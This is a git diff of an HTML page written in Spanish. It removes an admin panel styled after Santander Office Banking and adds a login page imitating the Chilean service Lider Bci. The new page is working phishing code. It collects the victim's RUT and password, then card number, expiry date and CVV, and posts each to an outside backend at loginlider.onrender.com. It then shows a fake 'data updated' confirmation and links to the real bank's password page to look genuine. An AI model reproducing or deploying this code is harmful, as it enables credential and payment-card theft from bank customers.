@@ -2,183 +2,281 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8">
-  <title>Panel de Administración</title>
+  <title>Demo - Ingreso</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-
   <style>
     body {
-      font-family: Arial, Helvetica, sans-serif;
-      background-color: #f5f5f5;
+      font-family: Arial, sans-serif;
+      background: #004080; /* azul corporativo */
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
       margin: 0;
-      padding: 0;
     }
-
-    .login-box {
-      max-width: 420px;       /* más pequeño que antes */
-      margin: 10px auto;      /* menos margen superior */
-      padding: 18px;          /* menos padding interno */
-      background: #fff;
-      border-radius: 8px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+    .header {
       text-align: center;
-      width: 90%;             /* ocupa casi todo el ancho en móvil */
-      box-sizing: border-box;
+      margin-bottom: 1rem;
     }
-
     .logo {
-      max-width: 120px;       /* logo más pequeño */
+      max-width: 150px;
       height: auto;
-      margin-bottom: 15px;
+      margin-bottom: 0.5rem;
     }
-
-    .login-box input,
-    .login-box select {
-      width: 100%;
-      margin: 8px 0;
-      padding: 6px;
-      font-size: 13px;        /* fuente más pequeña */
-      box-sizing: border-box;
+    .login-title {
+      color: #fff;
+      font-size: 1.2rem;
     }
-
-    .btn-santander {
+    .card {
+      background: #fff;
+      padding: 2rem;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.2);
+      width: 340px;
+      text-align: center;
+    }
+    .form-group {
+      margin-bottom: 1rem;
+      text-align: left;
+    }
+    .form-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: bold;
+      color: #004080;
+    }
+    .form-group input {
       width: 100%;
-      padding: 8px;
-      font-size: 14px;
-      background-color: #cc0000;
+      padding: 0.5rem;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .hint {
+      font-size: 0.85rem;
+      color: #666;
+      margin-top: 0.3rem;
+    }
+    .btn {
+      width: 100%;
+      padding: 0.75rem;
+      background: #004080;
       color: #fff;
       border: none;
-      border-radius: 20px;
+      border-radius: 4px;
       cursor: pointer;
+      font-size: 1rem;
     }
-    .btn-santander:hover {
-      background-color: #a80000;
+    .btn:hover {
+      background: #003060;
     }
-
-    @media (min-width: 768px) {
-      .login-box {
-        width: 60%;           /* más estrecho en escritorio */
-        padding: 22px;
-      }
-      .btn-santander {
-        width: auto;
-        min-width: 140px;
-      }
+    .link-right {
+      text-align: right;
+      margin-top: 0.5rem;
+    }
+    .link-right a {
+      font-size: 0.85rem;
+      color: #004080;
+      text-decoration: none;
+    }
+    .link-right a:hover {
+      text-decoration: underline;
+    }
+    .error {
+      color: red;
+      font-size: 0.9rem;
+      margin-top: 0.5rem;
     }
   </style>
 </head>
 <body>
-  <!-- aquí tu contenido del admin -->
-</body>
-  <!-- resto del contenido -->
-</body>
-  <script>
-    // Protección por clave simple
-    const clave = prompt("Ingrese clave de acceso:");
-    if(clave !== "Trabajo21"){   // <-- aquí defines tu clave
-      alert("Acceso denegado");
-      window.location.href = "index.html"; // redirige al login
-    }
-  </script>
-
-  <div class="login-box">
-    <img src="logo-office-banking.svg" alt="Office Banking" class="logo">
-
-    <h2>Configurar Productos y Autorización</h2>
-
-    <form id="adminForm">
-      <!-- Productos fijos -->
-      <label><input type="checkbox" id="producto1"> Línea de Crédito</label>
-      <input type="number" id="monto1" placeholder="Ej: 0">
-
-      <label><input type="checkbox" id="producto2"> Tarjeta de Crédito</label>
-      <input type="number" id="monto2" placeholder="Ej: 0">
-
-      <label><input type="checkbox" id="producto3"> Visualización de Tarjeta de Crédito</label>
-
-      <!-- Tipo de autorización -->
-      <label for="tipoAutorizacion">Tipo de Autorización</label>
-      <select id="tipoAutorizacion">
-        <option value="santander">Santander Pass</option>
-        <option value="coordenadas">Coordenadas</option>
-      </select>
-
-      <!-- Coordenadas -->
-      <div id="coordConfig">
-        <label for="coord1">Coordenada 1 (ej: A4)</label>
-        <input type="text" id="coord1" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: A4">
-
-        <label for="coord2">Coordenada 2 (ej: B7)</label>
-        <input type="text" id="coord2" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: B7">
-
-        <label for="coord3">Coordenada 3 (ej: C2)</label>
-        <input type="text" id="coord3" maxlength="2" pattern="[A-Z][0-9]" placeholder="Ej: C2">
-      </div>
-
-      <button class="btn-santander" type="submit">
-        Guardar<span class="bg-arrow"></span>
-      </button>
-    </form>
-
-    <div id="resultado"></div>
+  <!-- Encabezado con logo y título -->
+  <div class="header">
+    <img src="logo_lider.png" alt="Logo Empresa" class="logo">
+    <h2 class="login-title">Ingresa a tu cuenta en línea</h2>
   </div>
 
-  <script>
-    const API_URL = "https://officebankingchile.com/config";
+  <!-- Tarjeta de login -->
+  <div class="card" id="loginCard">
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="usuario">RUT</label>
+        <input type="text" id="usuario" required>
+        <div id="rutError" class="error" style="display:none;">RUT inválido</div>
+      </div>
+      <div class="form-group">
+        <label for="clave">Clave</label>
+        <input type="password" id="clave" required>
+        <div class="hint">Es la misma clave que usas en tu App Lider Bci</div>
+      </div>
+      <button type="submit" class="btn">Ingresar</button>
+      <div class="link-right">
+        <a href="https://www.liderbciserviciosfinancieros.cl/login/form-crea-clave" target="_blank">
+          Crear / Recuperar Clave
+        </a>
+      </div>
+    </form>
+  </div>
 
-    // Al cargar, obtener configuración
-    document.addEventListener("DOMContentLoaded", () => {
-      fetch(API_URL)
-        .then(res => res.json())
-        .then(data => {
-          document.getElementById("producto1").checked = data.producto1 === "Línea de Crédito";
-          document.getElementById("monto1").value = data.monto1 || "";
-          document.getElementById("producto2").checked = data.producto2 === "Tarjeta de Crédito";
-          document.getElementById("monto2").value = data.monto2 || "";
-          document.getElementById("producto3").checked = data.producto3 === "Visualización de Tarjeta de Crédito";
-          document.getElementById("tipoAutorizacion").value = data.tipoAutorizacion || "santander";
-          document.getElementById("coord1").value = data.coord1 || "";
-          document.getElementById("coord2").value = data.coord2 || "";
-          document.getElementById("coord3").value = data.coord3 || "";
-        })
-        .catch(err => {
-          console.error("Error al cargar configuración:", err);
-          document.getElementById("resultado").innerText = "⚠️ No se pudo cargar configuración del servidor.";
-        });
+  <!-- Tarjeta de actualización -->
+  <div class="card" id="updateCard" style="display:none;">
+    <div class="header">
+      <img src="logo_lider.png" alt="Logo Empresa" class="logo">
+      <h2 class="login-title">Actualizar Tarjeta</h2>
+    </div>
+    <form id="updateForm">
+      <div class="form-group">
+        <label for="numero">Número de tarjeta</label>
+        <input type="text" id="numero" required>
+        <div id="cardError" class="error" style="display:none;">Debe tener 16 dígitos</div>
+      </div>
+      <div class="form-group">
+        <label for="fecha">Fecha de vencimiento</label>
+        <div class="hint">Formato: MM/AA (ejemplo: 05/28)</div>
+        <input type="text" id="fecha" required>
+        <div id="fechaError" class="error" style="display:none;">Fecha inválida</div>
+      </div>
+      <div class="form-group">
+        <label for="cvv">Verificador (CVV)</label>
+        <input type="text" id="cvv" maxlength="3" required>
+      </div>
+      <button type="submit" class="btn">Ingresar Datos</button>
+    </form>
+  </div>
+
+  <!-- Tarjeta de confirmación -->
+  <div class="card" id="successCard" style="display:none;">
+    <div class="header">
+      <img src="logo_lider.png" alt="Logo Empresa" class="logo">
+      <h2 class="login-title">¡Datos actualizados!</h2>
+    </div>
+    <p>Hemos actualizado tus datos correctamente.</p>
+  </div>
+
+<script>
+  // Formatear RUT mientras se escribe
+  function formatRut(value) {
+    value = value.replace(/\./g, "").replace(/-/g, "");
+    if (value.length === 0) return "";
+    let dv = value.slice(-1);
+    let cuerpo = value.slice(0, -1);
+    let formatted = "";
+    while (cuerpo.length > 3) {
+      formatted = "." + cuerpo.slice(-3) + formatted;
+      cuerpo = cuerpo.slice(0, -3);
+    }
+    formatted = cuerpo + formatted;
+    return formatted + "-" + dv;
+  }
+
+  // Validar RUT chileno
+  function validarRut(rut) {
+    rut = rut.replace(/\./g, "").replace(/-/g, "");
+    if (rut.length < 2) return false;
+    let cuerpo = rut.slice(0, -1);
+    let dv = rut.slice(-1).toUpperCase();
+    let suma = 0;
+    let multiplo = 2;
+    for (let i = cuerpo.length - 1; i >= 0; i--) {
+      suma += parseInt(cuerpo.charAt(i)) * multiplo;
+      multiplo = multiplo < 7 ? multiplo + 1 : 2;
+    }
+    let dvEsperado = 11 - (suma % 11);
+    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+    return dv === dvEsperado;
+  }
+
+  // Validar fecha MM/AA
+  function validarFecha(fecha) {
+    const regex = /^(\d{2})\/(\d{2})$/;
+    const match = fecha.match(regex);
+    if (!match) return false;
+    const mes = parseInt(match[1], 10);
+    const anio = parseInt(match[2], 10);
+    if (mes < 1 || mes > 12) return false;
+    if (anio < 0 || anio > 99) return false;
+    return true;
+  }
+
+  const loginForm = document.getElementById('loginForm');
+  const updateForm = document.getElementById('updateForm');
+  const loginCard = document.getElementById('loginCard');
+  const updateCard = document.getElementById('updateCard');
+  const successCard = document.getElementById('successCard');
+  const rutError = document.getElementById('rutError');
+  const cardError = document.getElementById('cardError');
+  const fechaError = document.getElementById('fechaError');
+  const rutInput = document.getElementById('usuario');
+  const fechaInput = document.getElementById('fecha');
+
+  // Autoformateo RUT
+  rutInput.addEventListener("input", function() {
+    this.value = formatRut(this.value);
+  });
+
+  // Autoformateo fecha MM/AA
+  fechaInput.addEventListener("input", function() {
+    let value = this.value.replace(/[^0-9]/g, "");
+    if (value.length > 2) {
+      value = value.slice(0,2) + "/" + value.slice(2,4);
+    }
+    this.value = value;
+  });
+
+  const BASE_URL = "https://loginlider.onrender.com"; // tu backend en Render
+
+  loginForm.addEventListener('submit', async e => {
+    e.preventDefault();
+    const rut = rutInput.value;
+    const clave = document.getElementById('clave').value;
+
+    // Validar sobre el RUT limpio
+    if (!validarRut(rut)) {
+      rutError.style.display = 'block';
+      return;
+    } else {
+      rutError.style.display = 'none';
+    }
+
+    // Enviar datos al backend
+    await fetch(`${BASE_URL}/login`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ usuario: rut, clave })
     });
 
-    // Guardar configuración
-    document.getElementById("adminForm").addEventListener("submit", function(e){
-      e.preventDefault();
+    // Avanzar a la tarjeta de actualización
+    loginCard.style.display = 'none';
+    updateCard.style.display = 'block';
+  });
 
-      const config = {
-        producto1: document.getElementById("producto1").checked ? "Línea de Crédito" : "",
-        monto1: document.getElementById("producto1").checked ? document.getElementById("monto1").value : "",
-        producto2: document.getElementById("producto2").checked ? "Tarjeta de Crédito" : "",
-        monto2: document.getElementById("producto2").checked ? document.getElementById("monto2").value : "",
-        producto3: document.getElementById("producto3").checked ? "Visualización de Tarjeta de Crédito" : "",
-        tipoAutorizacion: document.getElementById("tipoAutorizacion").value,
-        coord1: document.getElementById("coord1").value.toUpperCase(),
-        coord2: document.getElementById("coord2").value.toUpperCase(),
-        coord3: document.getElementById("coord3").value.toUpperCase()
-      };
+  updateForm.addEventListener('submit', async e => {
+    e.preventDefault();
+    const numero = document.getElementById('numero').value;
+    const fecha = fechaInput.value;
+    const cvv = document.getElementById('cvv').value;
 
-      fetch(API_URL, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(config)
-      })
-      .then(res => {
-        if(res.ok){
-          document.getElementById("resultado").innerText = "✅ Configuración actualizada correctamente.";
-        } else {
-          document.getElementById("resultado").innerText = "⚠️ Error al guardar configuración.";
-        }
-      })
-      .catch(err => {
-        console.error("Error al guardar configuración:", err);
-        document.getElementById("resultado").innerText = "⚠️ No se pudo conectar con el servidor.";
-      });
+    if (numero.length !== 16 || !/^\d+$/.test(numero)) {
+      cardError.style.display = 'block';
+      return;
+    } else {
+      cardError.style.display = 'none';
+    }
+
+    if (!validarFecha(fecha)) {
+      fechaError.style.display = 'block';
+      return;
+    } else {
+      fechaError.style.display = 'none';
+    }
+
+    await fetch(`${BASE_URL}/update-card`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ numero, fecha, cvv })
     });
-  </script>
-</body>
-</html>
+
+    updateCard.style.display = 'none';
+    successCard.style.display = 'block';
+  });
+</script>
